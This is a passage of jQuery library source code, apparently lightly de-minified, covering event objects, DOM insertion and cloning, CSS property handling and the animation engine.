          if (this.originalEvent) return t(this.originalEvent)
        } : function () {
          if (this.originalEvent) return this.originalEvent[e]
        },
        set: function (t) {
          Object.defineProperty(this, e, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: t
          })
        }
      })
    },
    fix: function (e) {
      return e[jQuery.expando] ? e : new jQuery.Event(e)
    },
    special: {
      load: {
        noBubble: !0
      },
      focus: {
        trigger: function () {
          if (this !== safeActiveElement() && this.focus) return this.focus(), !1
        },
        delegateType: "focusin"
      },
      blur: {
        trigger: function () {
          if (this === safeActiveElement() && this.blur) return this.blur(), !1
        },
        delegateType: "focusout"
      },
      click: {
        trigger: function () {
          if ("checkbox" === this.type && this.click && nodeName(this, "input")) return this.click(), !1
        },
        _default: function (e) {
          return nodeName(e.target, "a")
        }
      },
      beforeunload: {
        postDispatch: function (e) {
          void 0 !== e.result && e.originalEvent && (e.originalEvent.returnValue = e.result)
        }
      }
    }
  }, jQuery.removeEvent = function (e, t, n) {
    e.removeEventListener && e.removeEventListener(t, n)
  }, jQuery.Event = function (e, t) {
    if (!(this instanceof jQuery.Event)) return new jQuery.Event(e, t);
    e && e.type ? (this.originalEvent = e, this.type = e.type, this.isDefaultPrevented = e.defaultPrevented || void 0 === e.defaultPrevented && !1 === e.returnValue ? returnTrue : returnFalse, this.target = e.target && 3 === e.target.nodeType ? e.target.parentNode : e.target, this.currentTarget = e.currentTarget, this.relatedTarget = e.relatedTarget) : this.type = e, t && jQuery.extend(this, t), this.timeStamp = e && e.timeStamp || Date.now(), this[jQuery.expando] = !0
  }, jQuery.Event.prototype = {
    constructor: jQuery.Event,
    isDefaultPrevented: returnFalse,
    isPropagationStopped: returnFalse,
    isImmediatePropagationStopped: returnFalse,
    isSimulated: !1,
    preventDefault: function () {
      var e = this.originalEvent;
      this.isDefaultPrevented = returnTrue, e && !this.isSimulated && e.preventDefault()
    },
    stopPropagation: function () {
      var e = this.originalEvent;
      this.isPropagationStopped = returnTrue, e && !this.isSimulated && e.stopPropagation()
    },
    stopImmediatePropagation: function () {
      var e = this.originalEvent;
      this.isImmediatePropagationStopped = returnTrue, e && !this.isSimulated && e.stopImmediatePropagation(), this.stopPropagation()
    }
  }, jQuery.each({
    altKey: !0,
    bubbles: !0,
    cancelable: !0,
    changedTouches: !0,
    ctrlKey: !0,
    detail: !0,
    eventPhase: !0,
    metaKey: !0,
    pageX: !0,
    pageY: !0,
    shiftKey: !0,
    view: !0,
    char: !0,
    charCode: !0,
    key: !0,
    keyCode: !0,
    button: !0,
    buttons: !0,
    clientX: !0,
    clientY: !0,
    offsetX: !0,
    offsetY: !0,
    pointerId: !0,
    pointerType: !0,
    screenX: !0,
    screenY: !0,
    targetTouches: !0,
    toElement: !0,
    touches: !0,
    which: function (e) {
      var t = e.button;
      return null == e.which && rkeyEvent.test(e.type) ? null != e.charCode ? e.charCode : e.keyCode : !e.which && void 0 !== t && rmouseEvent.test(e.type) ? 1 & t ? 1 : 2 & t ? 3 : 4 & t ? 2 : 0 : e.which
    }
  }, jQuery.event.addProp), jQuery.each({
    mouseenter: "mouseover",
    mouseleave: "mouseout",
    pointerenter: "pointerover",
    pointerleave: "pointerout"
  }, function (e, t) {
    jQuery.event.special[e] = {
      delegateType: t,
      bindType: t,
      handle: function (e) {
        var n, r = e.relatedTarget,
          i = e.handleObj;
        return r && (r === this || jQuery.contains(this, r)) || (e.type = i.origType, n = i.handler.apply(this, arguments), e.type = t), n
      }
    }
  }), jQuery.fn.extend({
    on: function (e, t, n, r) {
      return on(this, e, t, n, r)
    },
    one: function (e, t, n, r) {
      return on(this, e, t, n, r, 1)
    },
    off: function (e, t, n) {
      var r, i;
      if (e && e.preventDefault && e.handleObj) return r = e.handleObj, jQuery(e.delegateTarget).off(r.namespace ? r.origType + "." + r.namespace : r.origType, r.selector, r.handler), this;
      if ("object" == typeof e) {
        for (i in e) this.off(i, t, e[i]);
        return this
      }
      return !1 !== t && "function" != typeof t || (n = t, t = void 0), !1 === n && (n = returnFalse), this.each(function () {
        jQuery.event.remove(this, e, n, t)
      })
    }
  });
  var rxhtmlTag = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi,
    rnoInnerhtml = /<script|<style|<link/i,
    rchecked = /checked\s*(?:[^=]|=\s*.checked.)/i,
    rcleanScript = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;

  function manipulationTarget(e, t) {
    return nodeName(e, "table") && nodeName(11 !== t.nodeType ? t : t.firstChild, "tr") && jQuery(e).children("tbody")[0] || e
  }

  function disableScript(e) {
    return e.type = (null !== e.getAttribute("type")) + "/" + e.type, e
  }

  function restoreScript(e) {
    return "true/" === (e.type || "").slice(0, 5) ? e.type = e.type.slice(5) : e.removeAttribute("type"), e
  }

  function cloneCopyEvent(e, t) {
    var n, r, i, o, a, u, s, l;
    if (1 === t.nodeType) {
      if (dataPriv.hasData(e) && (o = dataPriv.access(e), a = dataPriv.set(t, o), l = o.events)) {
        delete a.handle, a.events = {};
        for (i in l)
          for (n = 0, r = l[i].length; n < r; n++) jQuery.event.add(t, i, l[i][n])
      }
      dataUser.hasData(e) && (u = dataUser.access(e), s = jQuery.extend({}, u), dataUser.set(t, s))
    }
  }

  function fixInput(e, t) {
    var n = t.nodeName.toLowerCase();
    "input" === n && rcheckableType.test(e.type) ? t.checked = e.checked : "input" !== n && "textarea" !== n || (t.defaultValue = e.defaultValue)
  }

  function domManip(e, t, n, r) {
    t = concat.apply([], t);
    var i, o, a, u, s, l, c = 0,
      p = e.length,
      d = p - 1,
      f = t[0],
      y = isFunction(f);
    if (y || p > 1 && "string" == typeof f && !support.checkClone && rchecked.test(f)) return e.each(function (i) {
      var o = e.eq(i);
      y && (t[0] = f.call(this, i, o.html())), domManip(o, t, n, r)
    });
    if (p && (o = (i = buildFragment(t, e[0].ownerDocument, !1, e, r)).firstChild, 1 === i.childNodes.length && (i = o), o || r)) {
      for (u = (a = jQuery.map(getAll(i, "script"), disableScript)).length; c < p; c++) s = i, c !== d && (s = jQuery.clone(s, !0, !0), u && jQuery.merge(a, getAll(s, "script"))), n.call(e[c], s, c);
      if (u)
        for (l = a[a.length - 1].ownerDocument, jQuery.map(a, restoreScript), c = 0; c < u; c++) s = a[c], rscriptType.test(s.type || "") && !dataPriv.access(s, "globalEval") && jQuery.contains(l, s) && (s.src && "module" !== (s.type || "").toLowerCase() ? jQuery._evalUrl && jQuery._evalUrl(s.src) : DOMEval(s.textContent.replace(rcleanScript, ""), l, s))
    }
    return e
  }

  function remove(e, t, n) {
    for (var r, i = t ? jQuery.filter(t, e) : e, o = 0; null != (r = i[o]); o++) n || 1 !== r.nodeType || jQuery.cleanData(getAll(r)), r.parentNode && (n && jQuery.contains(r.ownerDocument, r) && setGlobalEval(getAll(r, "script")), r.parentNode.removeChild(r));
    return e
  }
  jQuery.extend({
    htmlPrefilter: function (e) {
      return e.replace(rxhtmlTag, "<$1></$2>")
    },
    clone: function (e, t, n) {
      var r, i, o, a, u = e.cloneNode(!0),
        s = jQuery.contains(e.ownerDocument, e);
      if (!(support.noCloneChecked || 1 !== e.nodeType && 11 !== e.nodeType || jQuery.isXMLDoc(e)))
        for (a = getAll(u), r = 0, i = (o = getAll(e)).length; r < i; r++) fixInput(o[r], a[r]);
      if (t)
        if (n)
          for (o = o || getAll(e), a = a || getAll(u), r = 0, i = o.length; r < i; r++) cloneCopyEvent(o[r], a[r]);
        else cloneCopyEvent(e, u);
      return (a = getAll(u, "script")).length > 0 && setGlobalEval(a, !s && getAll(e, "script")), u
    },
    cleanData: function (e) {
      for (var t, n, r, i = jQuery.event.special, o = 0; void 0 !== (n = e[o]); o++)
        if (acceptData(n)) {
          if (t = n[dataPriv.expando]) {
            if (t.events)
              for (r in t.events) i[r] ? jQuery.event.remove(n, r) : jQuery.removeEvent(n, r, t.handle);
            n[dataPriv.expando] = void 0
          }
          n[dataUser.expando] && (n[dataUser.expando] = void 0)
        }
    }
  }), jQuery.fn.extend({
    detach: function (e) {
      return remove(this, e, !0)
    },
    remove: function (e) {
      return remove(this, e)
    },
    text: function (e) {
      return access(this, function (e) {
        return void 0 === e ? jQuery.text(this) : this.empty().each(function () {
          1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || (this.textContent = e)
        })
      }, null, e, arguments.length)
    },
    append: function () {
      return domManip(this, arguments, function (e) {
        1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || manipulationTarget(this, e).appendChild(e)
      })
    },
    prepend: function () {
      return domManip(this, arguments, function (e) {
        if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
          var t = manipulationTarget(this, e);
          t.insertBefore(e, t.firstChild)
        }
      })
    },
    before: function () {
      return domManip(this, arguments, function (e) {
        this.parentNode && this.parentNode.insertBefore(e, this)
      })
    },
    after: function () {
      return domManip(this, arguments, function (e) {
        this.parentNode && this.parentNode.insertBefore(e, this.nextSibling)
      })
    },
    empty: function () {
      for (var e, t = 0; null != (e = this[t]); t++) 1 === e.nodeType && (jQuery.cleanData(getAll(e, !1)), e.textContent = "");
      return this
    },
    clone: function (e, t) {
      return e = null != e && e, t = null == t ? e : t, this.map(function () {
        return jQuery.clone(this, e, t)
      })
    },
    html: function (e) {
      return access(this, function (e) {
        var t = this[0] || {},
          n = 0,
          r = this.length;
        if (void 0 === e && 1 === t.nodeType) return t.innerHTML;
        if ("string" == typeof e && !rnoInnerhtml.test(e) && !wrapMap[(rtagName.exec(e) || ["", ""])[1].toLowerCase()]) {
          e = jQuery.htmlPrefilter(e);
          try {
            for (; n < r; n++) 1 === (t = this[n] || {}).nodeType && (jQuery.cleanData(getAll(t, !1)), t.innerHTML = e);
            t = 0
          } catch (e) {}
        }
        t && this.empty().append(e)
      }, null, e, arguments.length)
    },
    replaceWith: function () {
      var e = [];
      return domManip(this, arguments, function (t) {
        var n = this.parentNode;
        jQuery.inArray(this, e) < 0 && (jQuery.cleanData(getAll(this)), n && n.replaceChild(t, this))
      }, e)
    }
  }), jQuery.each({
    appendTo: "append",
    prependTo: "prepend",
    insertBefore: "before",
    insertAfter: "after",
    replaceAll: "replaceWith"
  }, function (e, t) {
    jQuery.fn[e] = function (e) {
      for (var n, r = [], i = jQuery(e), o = i.length - 1, a = 0; a <= o; a++) n = a === o ? this : this.clone(!0), jQuery(i[a])[t](n), push.apply(r, n.get());
      return this.pushStack(r)
    }
  });
  var rnumnonpx = new RegExp("^(" + pnum + ")(?!px)[a-z%]+$", "i"),
    getStyles = function (e) {
      var t = e.ownerDocument.defaultView;
      return t && t.opener || (t = window), t.getComputedStyle(e)
    },
    rboxStyle = new RegExp(cssExpand.join("|"), "i");

  function curCSS(e, t, n) {
    var r, i, o, a, u = e.style;
    return (n = n || getStyles(e)) && ("" !== (a = n.getPropertyValue(t) || n[t]) || jQuery.contains(e.ownerDocument, e) || (a = jQuery.style(e, t)), !support.pixelBoxStyles() && rnumnonpx.test(a) && rboxStyle.test(t) && (r = u.width, i = u.minWidth, o = u.maxWidth, u.minWidth = u.maxWidth = u.width = a, a = n.width, u.width = r, u.minWidth = i, u.maxWidth = o)), void 0 !== a ? a + "" : a
  }

  function addGetHookIf(e, t) {
    return {
      get: function () {
        if (!e()) return (this.get = t).apply(this, arguments);
        delete this.get
      }
    }
  }! function () {
    function e() {
      if (s) {
        u.style.cssText = "position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0", s.style.cssText = "position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%", documentElement.appendChild(u).appendChild(s);
        var e = window.getComputedStyle(s);
        n = "1%" !== e.top, a = 12 === t(e.marginLeft), s.style.right = "60%", o = 36 === t(e.right), r = 36 === t(e.width), s.style.position = "absolute", i = 36 === s.offsetWidth || "absolute", documentElement.removeChild(u), s = null
      }
    }

    function t(e) {
      return Math.round(parseFloat(e))
    }
    var n, r, i, o, a, u = document.createElement("div"),
      s = document.createElement("div");
    s.style && (s.style.backgroundClip = "content-box", s.cloneNode(!0).style.backgroundClip = "", support.clearCloneStyle = "content-box" === s.style.backgroundClip, jQuery.extend(support, {
      boxSizingReliable: function () {
        return e(), r
      },
      pixelBoxStyles: function () {
        return e(), o
      },
      pixelPosition: function () {
        return e(), n
      },
      reliableMarginLeft: function () {
        return e(), a
      },
      scrollboxSize: function () {
        return e(), i
      }
    }))
  }();
  var rdisplayswap = /^(none|table(?!-c[ea]).+)/,
    rcustomProp = /^--/,
    cssShow = {
      position: "absolute",
      visibility: "hidden",
      display: "block"
    },
    cssNormalTransform = {
      letterSpacing: "0",
      fontWeight: "400"
    },
    cssPrefixes = ["Webkit", "Moz", "ms"],
    emptyStyle = document.createElement("div").style;

  function vendorPropName(e) {
    if (e in emptyStyle) return e;
    for (var t = e[0].toUpperCase() + e.slice(1), n = cssPrefixes.length; n--;)
      if ((e = cssPrefixes[n] + t) in emptyStyle) return e
  }

  function finalPropName(e) {
    var t = jQuery.cssProps[e];
    return t || (t = jQuery.cssProps[e] = vendorPropName(e) || e), t
  }

  function setPositiveNumber(e, t, n) {
    var r = rcssNum.exec(t);
    return r ? Math.max(0, r[2] - (n || 0)) + (r[3] || "px") : t
  }

  function boxModelAdjustment(e, t, n, r, i, o) {
    var a = "width" === t ? 1 : 0,
      u = 0,
      s = 0;
    if (n === (r ? "border" : "content")) return 0;
    for (; a < 4; a += 2) "margin" === n && (s += jQuery.css(e, n + cssExpand[a], !0, i)), r ? ("content" === n && (s -= jQuery.css(e, "padding" + cssExpand[a], !0, i)), "margin" !== n && (s -= jQuery.css(e, "border" + cssExpand[a] + "Width", !0, i))) : (s += jQuery.css(e, "padding" + cssExpand[a], !0, i), "padding" !== n ? s += jQuery.css(e, "border" + cssExpand[a] + "Width", !0, i) : u += jQuery.css(e, "border" + cssExpand[a] + "Width", !0, i));
    return !r && o >= 0 && (s += Math.max(0, Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - o - s - u - .5))), s
  }

  function getWidthOrHeight(e, t, n) {
    var r = getStyles(e),
      i = curCSS(e, t, r),
      o = "border-box" === jQuery.css(e, "boxSizing", !1, r),
      a = o;
    if (rnumnonpx.test(i)) {
      if (!n) return i;
      i = "auto"
    }
    return a = a && (support.boxSizingReliable() || i === e.style[t]), ("auto" === i || !parseFloat(i) && "inline" === jQuery.css(e, "display", !1, r)) && (i = e["offset" + t[0].toUpperCase() + t.slice(1)], a = !0), (i = parseFloat(i) || 0) + boxModelAdjustment(e, t, n || (o ? "border" : "content"), a, r, i) + "px"
  }

  function Tween(e, t, n, r, i) {
    return new Tween.prototype.init(e, t, n, r, i)
  }
  jQuery.extend({
    cssHooks: {
      opacity: {
        get: function (e, t) {
          if (t) {
            var n = curCSS(e, "opacity");
            return "" === n ? "1" : n
          }
        }
      }
    },
    cssNumber: {
      animationIterationCount: !0,
      columnCount: !0,
      fillOpacity: !0,
      flexGrow: !0,
      flexShrink: !0,
      fontWeight: !0,
      lineHeight: !0,
      opacity: !0,
      order: !0,
      orphans: !0,
      widows: !0,
      zIndex: !0,
      zoom: !0
    },
    cssProps: {},
    style: function (e, t, n, r) {
      if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
        var i, o, a, u = camelCase(t),
          s = rcustomProp.test(t),
          l = e.style;
        if (s || (t = finalPropName(u)), a = jQuery.cssHooks[t] || jQuery.cssHooks[u], void 0 === n) return a && "get" in a && void 0 !== (i = a.get(e, !1, r)) ? i : l[t];
        "string" === (o = typeof n) && (i = rcssNum.exec(n)) && i[1] && (n = adjustCSS(e, t, i), o = "number"), null != n && n == n && ("number" === o && (n += i && i[3] || (jQuery.cssNumber[u] ? "" : "px")), support.clearCloneStyle || "" !== n || 0 !== t.indexOf("background") || (l[t] = "inherit"), a && "set" in a && void 0 === (n = a.set(e, n, r)) || (s ? l.setProperty(t, n) : l[t] = n))
      }
    },
    css: function (e, t, n, r) {
      var i, o, a, u = camelCase(t);
      return rcustomProp.test(t) || (t = finalPropName(u)), (a = jQuery.cssHooks[t] || jQuery.cssHooks[u]) && "get" in a && (i = a.get(e, !0, n)), void 0 === i && (i = curCSS(e, t, r)), "normal" === i && t in cssNormalTransform && (i = cssNormalTransform[t]), "" === n || n ? (o = parseFloat(i), !0 === n || isFinite(o) ? o || 0 : i) : i
    }
  }), jQuery.each(["height", "width"], function (e, t) {
    jQuery.cssHooks[t] = {
      get: function (e, n, r) {
        if (n) return !rdisplayswap.test(jQuery.css(e, "display")) || e.getClientRects().length && e.getBoundingClientRect().width ? getWidthOrHeight(e, t, r) : swap(e, cssShow, function () {
          return getWidthOrHeight(e, t, r)
        })
      },
      set: function (e, n, r) {
        var i, o = getStyles(e),
          a = "border-box" === jQuery.css(e, "boxSizing", !1, o),
          u = r && boxModelAdjustment(e, t, r, a, o);
        return a && support.scrollboxSize() === o.position && (u -= Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - parseFloat(o[t]) - boxModelAdjustment(e, t, "border", !1, o) - .5)), u && (i = rcssNum.exec(n)) && "px" !== (i[3] || "px") && (e.style[t] = n, n = jQuery.css(e, t)), setPositiveNumber(e, n, u)
      }
    }
  }), jQuery.cssHooks.marginLeft = addGetHookIf(support.reliableMarginLeft, function (e, t) {
    if (t) return (parseFloat(curCSS(e, "marginLeft")) || e.getBoundingClientRect().left - swap(e, {
      marginLeft: 0
    }, function () {
      return e.getBoundingClientRect().left
    })) + "px"
  }), jQuery.each({
    margin: "",
    padding: "",
    border: "Width"
  }, function (e, t) {
    jQuery.cssHooks[e + t] = {
      expand: function (n) {
        for (var r = 0, i = {}, o = "string" == typeof n ? n.split(" ") : [n]; r < 4; r++) i[e + cssExpand[r] + t] = o[r] || o[r - 2] || o[0];
        return i
      }
    }, "margin" !== e && (jQuery.cssHooks[e + t].set = setPositiveNumber)
  }), jQuery.fn.extend({
    css: function (e, t) {
      return access(this, function (e, t, n) {
        var r, i, o = {},
          a = 0;
        if (Array.isArray(t)) {
          for (r = getStyles(e), i = t.length; a < i; a++) o[t[a]] = jQuery.css(e, t[a], !1, r);
          return o
        }
        return void 0 !== n ? jQuery.style(e, t, n) : jQuery.css(e, t)
      }, e, t, arguments.length > 1)
    }
  }), jQuery.Tween = Tween, Tween.prototype = {
    constructor: Tween,
    init: function (e, t, n, r, i, o) {
      this.elem = e, this.prop = n, this.easing = i || jQuery.easing._default, this.options = t, this.start = this.now = this.cur(), this.end = r, this.unit = o || (jQuery.cssNumber[n] ? "" : "px")
    },
    cur: function () {
      var e = Tween.propHooks[this.prop];
      return e && e.get ? e.get(this) : Tween.propHooks._default.get(this)
    },
    run: function (e) {
      var t, n = Tween.propHooks[this.prop];
      return this.options.duration ? this.pos = t = jQuery.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration) : this.pos = t = e, this.now = (this.end - this.start) * t + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), n && n.set ? n.set(this) : Tween.propHooks._default.set(this), this
    }
  }, Tween.prototype.init.prototype = Tween.prototype, Tween.propHooks = {
    _default: {
      get: function (e) {
        var t;
        return 1 !== e.elem.nodeType || null != e.elem[e.prop] && null == e.elem.style[e.prop] ? e.elem[e.prop] : (t = jQuery.css(e.elem, e.prop, "")) && "auto" !== t ? t : 0
      },
      set: function (e) {
        jQuery.fx.step[e.prop] ? jQuery.fx.step[e.prop](e) : 1 !== e.elem.nodeType || null == e.elem.style[jQuery.cssProps[e.prop]] && !jQuery.cssHooks[e.prop] ? e.elem[e.prop] = e.now : jQuery.style(e.elem, e.prop, e.now + e.unit)
      }
    }
  }, Tween.propHooks.scrollTop = Tween.propHooks.scrollLeft = {
    set: function (e) {
      e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now)
    }
  }, jQuery.easing = {
    linear: function (e) {
      return e
    },
    swing: function (e) {
      return .5 - Math.cos(e * Math.PI) / 2
    },
    _default: "swing"
  }, jQuery.fx = Tween.prototype.init, jQuery.fx.step = {};
  var fxNow, inProgress, rfxtypes = /^(?:toggle|show|hide)$/,
    rrun = /queueHooks$/,
    Pw, Rw;

  function schedule() {
    inProgress && (!1 === document.hidden && window.requestAnimationFrame ? window.requestAnimationFrame(schedule) : window.setTimeout(schedule, jQuery.fx.interval), jQuery.fx.tick())
  }

  function createFxNow() {
    return window.setTimeout(function () {
      fxNow = void 0
    }), fxNow = Date.now()
  }

  function genFx(e, t) {
    var n, r = 0,
      i = {
        height: e
      };
    for (t = t ? 1 : 0; r < 4; r += 2 - t) i["margin" + (n = cssExpand[r])] = i["padding" + n] = e;
    return t && (i.opacity = i.width = e), i
  }

  function createTween(e, t, n) {
    for (var r, i = (Animation.tweeners[t] || []).concat(Animation.tweeners["*"]), o = 0, a = i.length; o < a; o++)
      if (r = i[o].call(n, t, e)) return r
  }

  function defaultPrefilter(e, t, n) {
    var r, i, o, a, u, s, l, c, p = "width" in t || "height" in t,
      d = this,
      f = {},
      y = e.style,
      h = e.nodeType && isHiddenWithinTree(e),
      m = dataPriv.get(e, "fxshow");
    n.queue || (null == (a = jQuery._queueHooks(e, "fx")).unqueued && (a.unqueued = 0, u = a.empty.fire, a.empty.fire = function () {
      a.unqueued || u()
    }), a.unqueued++, d.always(function () {
      d.always(function () {
        a.unqueued--, jQuery.queue(e, "fx").length || a.empty.fire()
      })
    }));
    for (r in t)
      if (i = t[r], rfxtypes.test(i)) {
        if (delete t[r], o = o || "toggle" === i, i === (h ? "hide" : "show")) {
          if ("show" !== i || !m || void 0 === m[r]) continue;
          h = !0
        }
        f[r] = m && m[r] || jQuery.style(e, r)
      } if ((s = !jQuery.isEmptyObject(t)) || !jQuery.isEmptyObject(f)) {
      p && 1 === e.nodeType && (n.overflow = [y.overflow, y.overflowX, y.overflowY], null == (l = m && m.display) && (l = dataPriv.get(e, "display")), "none" === (c = jQuery.css(e, "display")) && (l ? c = l : (showHide([e], !0), l = e.style.display || l, c = jQuery.css(e, "display"), showHide([e]))), ("inline" === c || "inline-block" === c && null != l) && "none" === jQuery.css(e, "float") && (s || (d.done(function () {
        y.display = l
      }), null == l && (c = y.display, l = "none" === c ? "" : c)), y.display = "inline-block")), n.overflow && (y.overflow = "hidden", d.always(function () {
        y.overflow = n.overflow[0], y.overflowX = n.overflow[1], y.overflowY = n.overflow[2]
      })), s = !1;
      for (r in f) s || (m ? "hidden" in m && (h = m.hidden) : m = dataPriv.access(e, "fxshow", {
        display: l
      }), o && (m.hidden = !h), h && showHide([e], !0), d.done(function () {
        h || showHide([e]), dataPriv.remove(e, "fxshow");
        for (r in f) jQuery.style(e, r, f[r])
      })), s = createTween(h ? m[r] : 0, r, d), r in m || (m[r] = s.start, h && (s.end = s.start, s.start = 0))
    }
  }

  function propFilter(e, t) {
    var n, r, i, o, a;
    for (n in e)
      if (i = t[r = camelCase(n)], o = e[n], Array.isArray(o) && (i = o[1], o = e[n] = o[0]), n !== r && (e[r] = o, delete e[n]), (a = jQuery.cssHooks[r]) && "expand" in a) {
        o = a.expand(o), delete e[r];
        for (n in o) n in e || (e[n] = o[n], t[n] = i)
      } else t[r] = i
  }

  function Animation(e, t, n) {
    var r, i, o = 0,
      a = Animation.prefilters.length,
      u = jQuery.Deferred().always(function () {
        delete s.elem
      }),
      s = function () {
        if (i) return !1;
        for (var t = fxNow || createFxNow(), n = Math.max(0, l.startTime + l.duration - t), r = 1 - (n / l.duration || 0), o = 0, a = l.tweens.length; o < a; o++) l.tweens[o].run(r);
        return u.notifyWith(e, [l, r, n]), r < 1 && a ? n : (a || u.notifyWith(e, [l, 1, 0]), u.resolveWith(e, [l]), !1)
      },
      l = u.promise({
        elem: e,
        props: jQuery.extend({}, t),
        opts: jQuery.extend(!0, {
          specialEasing: {},
          easing: jQuery.easing._default
        }, n),
        originalProperties: t,
        originalOptions: n,
        startTime: fxNow || createFxNow(),
        duration: n.duration,
        tweens: [],
        createTween: function (t, n) {
          var r = jQuery.Tween(e, l.opts, t, n, l.opts.specialEasing[t] || l.opts.easing);
          return l.tweens.push(r), r
        },
        stop: function (t) {
          var n = 0,
            r = t ? l.tweens.length : 0;
          if (i) return this;
          for (i = !0; n < r; n++) l.tweens[n].run(1);
          return t ? (u.notifyWith(e, [l, 1, 0]), u.resolveWith(e, [l, t])) : u.rejectWith(e, [l, t]), this
        }
      }),
      c = l.props;
    for (propFilter(c, l.opts.specialEasing); o < a; o++)
      if (r = Animation.prefilters[o].call(l, e, c, l.opts)) return isFunction(r.stop) && (jQuery._queueHooks(l.elem, l.opts.queue).stop = r.stop.bind(r)), r;
    return jQuery.map(c, createTween, l), isFunction(l.opts.start) && l.opts.start.call(e, l), l.progress(l.opts.progress).done(l.opts.done, l.opts.complete).fail(l.opts.fail).always(l.opts.always), jQuery.fx.timer(jQuery.extend(s, {
      elem: e,
      anim: l,
      queue: l.opts.queue
    })), l
  }
  jQuery.Animation = jQuery.extend(Animation, {
    tweeners: {
      "*": [function (e, t) {
        var n = this.createTween(e, t);
        return adjustCSS(n.elem, e, rcssNum.exec(t), n), n
      }]
    },
    tweener: function (e, t) {
      isFunction(e) ? (t = e, e = ["*"]) : e = e.match(rnothtmlwhite);
      for (var n, r = 0, i = e.length; r < i; r++) n = e[r], Animation.tweeners[n] = Animation.tweeners[n] || [], Animation.tweeners[n].unshift(t)
    },
    prefilters: [defaultPrefilter],
    prefilter: function (e, t) {
      t ? Animation.prefilters.unshift(e) : Animation.prefilters.push(e)
    }
  }), jQuery.speed = function (e, t, n) {
    var r = e && "object" == typeof e ? jQuery.extend({}, e) : {
      complete: n || !n && t || isFunction(e) && e,
      duration: e,
      easing: n && t || t && !isFunction(t) && t
    };
    return jQuery.fx.off ? r.duration = 0 : "number" != typeof r.duration && (r.duration in jQuery.fx.speeds ? r.duration = jQuery.fx.speeds[r.duration] : r.duration = jQuery.fx.speeds._default), null != r.queue && !0 !== r.queue || (r.queue = "fx"), r.old = r.complete, r.complete = function () {
      isFunction(r.old) && r.old.call(this), r.queue && jQuery.dequeue(this, r.queue)
    }, r
  }, jQuery.fn.extend({
    fadeTo: function (e, t, n, r) {
      return this.filter(isHiddenWithinTree).css("opacity", 0).show().end().animate({
        opacity: t
      }, e, n, r)
    },
    animate: function (e, t, n, r) {
      var i = jQuery.isEmptyObject(e),
        o = jQuery.speed(t, n, r),
        a = function () {
          var t = Animation(this, jQuery.extend({}, e), o);
          (i || dataPriv.get(this, "finish")) && t.stop(!0)
        };
      return a.finish = a, i || !1 === o.queue ? this.each(a) : this.queue(o.queue, a)
    },
    stop: function (e, t, n) {
      var r = function (e) {
        var t = e.stop;
        delete e.stop, t(n)
      };
      return "string" != typeof e && (n = t, t = e, e = void 0), t && !1 !== e && this.queue(e || "fx", []), this.each(function () {
        var t = !0,
          i = null != e && e + "queueHooks",
          o = jQuery.timers,
          a = dataPriv.get(this);
        if (i) a[i] && a[i].stop && r(a[i]);
        else
          for (i in a) a[i] && a[i].stop && rrun.test(i) && r(a[i]);
        for (i = o.length; i--;) o[i].elem !== this || null != e && o[i].queue !== e || (o[i].anim.stop(n), t = !1, o.splice(i, 1));
        !t && n || jQuery.dequeue(this, e)
      })
    },
    finish: function (e) {
      return !1 !== e && (e = e || "fx"), this.each(function () {
        var t, n = dataPriv.get(this),
          r = n[e + "queue"],
          i = n[e + "queueHooks"],
          o = jQuery.timers,
          a = r ? r.length : 0;
        for (n.finish = !0, jQuery.queue(this, e, []), i && i.stop && i.stop.call(this, !0), t = o.length; t--;) o[t].elem === this && o[t].queue === e && (o[t].anim.stop(!0), o.splice(t, 1));
        for (t = 0; t < a; t++) r[t] && r[t].finish && r[t].finish.call(this);
        delete n.finish
      })
    }
  }), jQuery.each(["toggle", "show", "hide"], function (e, t) {
    var n = jQuery.fn[t];
    jQuery.fn[t] = function (e, r, i) {
      return null == e || "boolean" == typeof e ? n.apply(this, arguments) : this.animate(genFx(t, !0), e, r, i)
    }
  }), jQuery.each({
    slideDown: genFx("show"),
    slideUp: genFx("hide"),
    slideToggle: genFx("toggle"),
    fadeIn: {
      opacity: "show"
    },
    fadeOut: {
      opacity: "hide"
    },
    fadeToggle: {
      opacity: "toggle"
    }
  }, function (e, t) {
    jQuery.fn[e] = function (e, n, r) {
      return this.animate(t, e, n, r)
    }
  }), jQuery.timers = [], jQuery.fx.tick = function () {
    var e, t = 0,
      n = jQuery.timers;
    for (fxNow = Date.now(); t < n.length; t++)(e = n[t])() || n[t] !== e || n.splice(t--, 1);
    n.length || jQuery.fx.stop(), fxNow = void 0
  }, jQuery.fx.timer = function (e) {
    jQuery.timers.push(e), jQuery.fx.start()
  }, jQuery.fx.interval = 13, jQuery.fx.start = function () {
    inProgress || (inProgress = !0, schedule())
  }, jQuery.fx.stop = function () {
    inProgress = null
  }, jQuery.fx.speeds = {
    slow: 600,
    fast: 200,
    _default: 400
  }, jQuery.fn.delay = function (e, t) {
    return e = jQuery.fx && jQuery.fx.speeds[e] || e, t = t || "fx", this.queue(t, function (t, n) {
      var r = window.setTimeout(t, e);
      n.stop = function () {
        window.clearTimeout(r)
      }
    })
  }, Pw = document.createElement("input"), Rw = document.createElement("select").appendChild(document.createElement("option")), Pw.type = "checkbox", support.checkOn = "" !== Pw.value, support.optSelected = Rw.selected, (Pw = document.createElement("input")).value = "t", Pw.type = "radio", support.radioValue = "t" === Pw.value;
  var boolHook, attrHandle = jQuery.expr.attrHandle;
  jQuery.fn.extend({
    attr: function (e, t) {
      return access(this, jQuery.attr, e, t, arguments.length > 1)
    },
    removeAttr: function (e) {
      return this.each(function () {
        jQuery.removeAttr(this, e)
      })
    }
  }), jQuery.extend({
    attr: function (e, t, n) {
      var r, i, o = e.nodeType;
